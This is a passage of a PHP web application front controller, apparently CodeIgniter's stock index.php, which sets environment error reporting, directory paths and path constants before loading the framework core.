		ini_set('display_errors', 0);
		if (version_compare(PHP_VERSION, '5.3', '>='))
		{
			error_reporting(E_ALL & ~E_NOTICE & ~E_DEPRECATED & ~E_STRICT & ~E_USER_NOTICE & ~E_USER_DEPRECATED);
		}
		else
		{
			error_reporting(E_ALL & ~E_NOTICE & ~E_STRICT & ~E_USER_NOTICE);
		}
	break;

	default:
		header('HTTP/1.1 503 Service Unavailable.', TRUE, 503);
		echo 'The application environment is not set correctly.';
		exit(1); // EXIT_ERROR
}

/*
 *---------------------------------------------------------------
 * SYSTEM DIRECTORY NAME
 *---------------------------------------------------------------
 *
 * This variable must contain the name of your "system" directory.
 * Set the path if it is not in the same directory as this file.
 */
	$system_path = 'system';

/*
 *---------------------------------------------------------------
 * APPLICATION DIRECTORY NAME
 *---------------------------------------------------------------
 *
 * If you want this front controller to use a different "application"
 * directory than the default one you can set its name here. The directory
 * can also be renamed or relocated anywhere on your server. If you do,
 * use an absolute (full) server path.
 * For more info please see the user guide:
 *
 * https://codeigniter.com/user_guide/general/managing_apps.html
 *
 * NO TRAILING SLASH!
 */
	$application_folder = 'application';

/*
 *---------------------------------------------------------------
 * VIEW DIRECTORY NAME
 *---------------------------------------------------------------
 *
 * If you want to move the view directory out of the application
 * directory, set the path to it here. The directory can be renamed
 * and relocated anywhere on your server. If blank, it will default
 * to the standard location inside your application directory.
 * If you do move this, use an absolute (full) server path.
 *
 * NO TRAILING SLASH!
 */
	$view_folder = '';


/*
 * --------------------------------------------------------------------
 * DEFAULT CONTROLLER
 * --------------------------------------------------------------------
 *
 * Normally you will set your default controller in the routes.php file.
 * You can, however, force a custom routing by hard-coding a
 * specific controller class/function here. For most applications, you
 * WILL NOT set your routing here, but it's an option for those
 * special instances where you might want to override the standard
 * routing in a specific front controller that shares a common CI installation.
 *
 * IMPORTANT: If you set the routing here, NO OTHER controller will be
 * callable. In essence, this preference limits your application to ONE
 * specific controller. Leave the function name blank if you need
 * to call functions dynamically via the URI.
 *
 * Un-comment the $routing array below to use this feature
 */
	// The directory name, relative to the "controllers" directory.  Leave blank
	// if your controller is not in a sub-directory within the "controllers" one
	// $routing['directory'] = '';

	// The controller class file name.  Example:  mycontroller
	// $routing['controller'] = '';

	// The controller function you wish to be called.
	// $routing['function']	= '';


/*
 * -------------------------------------------------------------------
 *  CUSTOM CONFIG VALUES
 * -------------------------------------------------------------------
 *
 * The $assign_to_config array below will be passed dynamically to the
 * config class when initialized. This allows you to set custom config
 * items or override any default config values found in the config.php file.
 * This can be handy as it permits you to share one application between
 * multiple front controller files, with each file containing different
 * config values.
 *
 * Un-comment the $assign_to_config array below to use this feature
 */
	// $assign_to_config['name_of_config_item'] = 'value of config item';



// --------------------------------------------------------------------
// END OF USER CONFIGURABLE SETTINGS.  DO NOT EDIT BELOW THIS LINE
// --------------------------------------------------------------------

/*
 * ---------------------------------------------------------------
 *  Resolve the system path for increased reliability
 * ---------------------------------------------------------------
 */

	// Set the current directory correctly for CLI requests
	if (defined('STDIN'))
	{
		chdir(dirname(__FILE__));
	}

	if (($_temp = realpath($system_path)) !== FALSE)
	{
		$system_path = $_temp.DIRECTORY_SEPARATOR;
	}
	else
	{
		// Ensure there's a trailing slash
		$system_path = strtr(
			rtrim($system_path, '/\\'),
			'/\\',
			DIRECTORY_SEPARATOR.DIRECTORY_SEPARATOR
		).DIRECTORY_SEPARATOR;
	}

	// Is the system path correct?
	if ( ! is_dir($system_path))
	{
		header('HTTP/1.1 503 Service Unavailable.', TRUE, 503);
		echo 'Your system folder path does not appear to be set correctly. Please open the following file and correct this: '.pathinfo(__FILE__, PATHINFO_BASENAME);
		exit(3); // EXIT_CONFIG
	}

/*
 * -------------------------------------------------------------------
 *  Now that we know the path, set the main path constants
 * -------------------------------------------------------------------
 */
	// The name of THIS file
	define('SELF', pathinfo(__FILE__, PATHINFO_BASENAME));

	// Path to the system directory
	define('BASEPATH', $system_path);

	// Path to the front controller (this file) directory
	define('FCPATH', dirname(__FILE__).DIRECTORY_SEPARATOR);

	// Name of the "system" directory
	define('SYSDIR', basename(BASEPATH));

	// The path to the "application" directory
	if (is_dir($application_folder))
	{
		if (($_temp = realpath($application_folder)) !== FALSE)
		{
			$application_folder = $_temp;
		}
		else
		{
			$application_folder = strtr(
				rtrim($application_folder, '/\\'),
				'/\\',
				DIRECTORY_SEPARATOR.DIRECTORY_SEPARATOR
			);
		}
	}
	elseif (is_dir(BASEPATH.$application_folder.DIRECTORY_SEPARATOR))
	{
		$application_folder = BASEPATH.strtr(
			trim($application_folder, '/\\'),
			'/\\',
			DIRECTORY_SEPARATOR.DIRECTORY_SEPARATOR
		);
	}
	else
	{
		header('HTTP/1.1 503 Service Unavailable.', TRUE, 503);
		echo 'Your application folder path does not appear to be set correctly. Please open the following file and correct this: '.SELF;
		exit(3); // EXIT_CONFIG
	}

	define('APPPATH', $application_folder.DIRECTORY_SEPARATOR);

	// The path to the "views" directory
	if ( ! isset($view_folder[0]) && is_dir(APPPATH.'views'.DIRECTORY_SEPARATOR))
	{
		$view_folder = APPPATH.'views';
	}
	elseif (is_dir($view_folder))
	{
		if (($_temp = realpath($view_folder)) !== FALSE)
		{
			$view_folder = $_temp;
		}
		else
		{
			$view_folder = strtr(
				rtrim($view_folder, '/\\'),
				'/\\',
				DIRECTORY_SEPARATOR.DIRECTORY_SEPARATOR
			);
		}
	}
	elseif (is_dir(APPPATH.$view_folder.DIRECTORY_SEPARATOR))
	{
		$view_folder = APPPATH.strtr(
			trim($view_folder, '/\\'),
			'/\\',
			DIRECTORY_SEPARATOR.DIRECTORY_SEPARATOR
		);
	}
	else
	{
		header('HTTP/1.1 503 Service Unavailable.', TRUE, 503);
		echo 'Your view folder path does not appear to be set correctly. Please open the following file and correct this: '.SELF;
		exit(3); // EXIT_CONFIG
	}

	define('VIEWPATH', $view_folder.DIRECTORY_SEPARATOR);

/*
 * --------------------------------------------------------------------
 * LOAD THE BOOTSTRAP FILE
 * --------------------------------------------------------------------
 *
 * And away we go...
 */
require_once BASEPATH.'core/CodeIgniter.php';
